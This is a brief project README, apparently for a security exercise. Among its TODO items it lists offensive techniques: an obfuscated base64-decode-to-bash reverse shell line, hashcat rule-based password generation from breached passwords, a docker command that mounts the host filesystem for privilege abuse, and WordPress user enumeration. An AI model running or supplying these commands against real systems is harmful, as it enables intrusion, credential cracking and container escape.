# BAU-project
## TODO
1. Finish UI
2. Wordpress user enumeration via login.php? 
3. Nabil create a docker image
4. Public mysql?
5. Documentation :( 
999. after finally ( apt install forensics-all) (optional)

### PakageDownloader.c
```bash
# Reverse shell command
echo${IFS}<BASE64-Encoded-Payload>|base64${IFS}-d|bash
```
## Breach similation (might cancel..)
```
https://pastebin.com/UycbfwRP
```
## Password list
Download: https://github.com/clem9669/hashcat-rule/blob/master/clem9669_medium.rule
```
# mohammad_threats2022 (sample in PassFromBreach.txt )
hashcat -r clem9669_medium.rule --stdout PassFromBreach.txt > output.txt
```
## Docker priv abuse
```
docker run --rm -it -v /:/MountedFS ubuntu bash
```
